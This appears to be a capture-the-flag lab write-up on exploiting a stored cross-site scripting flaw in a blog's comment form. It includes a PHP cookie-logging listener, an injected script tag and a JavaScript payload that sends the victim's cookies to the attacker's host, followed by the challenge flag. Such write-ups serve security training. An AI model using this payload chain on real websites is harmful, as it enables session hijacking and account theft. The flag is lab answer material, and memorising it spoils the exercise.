Starting the PHP server:
```shell-session
php -S 0.0.0.0:80
```

The `index.php` file contains the following code, to grab the cookies to a file:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Found a web page where we could leave a comment:
http://10.129.136.14/assessment/index.php/2021/06/11/welcome-to-security-blog/

Website field is vulnerable:
![[Pasted image 20240510165023.png]]

With the script:
```html
<script src=http://10.10.14.250></script>
```

We have a `script.js` file ready in the same directory with the `index.php` file, with the following content:
```html
new Image().src='http://10.10.14.250/index.php?c='+document.cookie
```

Now lets try to enter the script to the vulnerable website field again:
![[Pasted image 20240510165919.png]]

And we got the flag:
![[Pasted image 20240510165948.png]]

HTB{cr055_5173_5cr1p71n6_n1nj4}